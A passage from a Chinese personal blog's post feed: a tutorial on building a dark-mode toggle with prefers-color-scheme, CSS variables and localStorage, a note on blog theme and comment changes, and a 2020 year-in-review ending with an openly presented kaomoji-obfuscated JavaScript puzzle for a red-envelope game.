class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 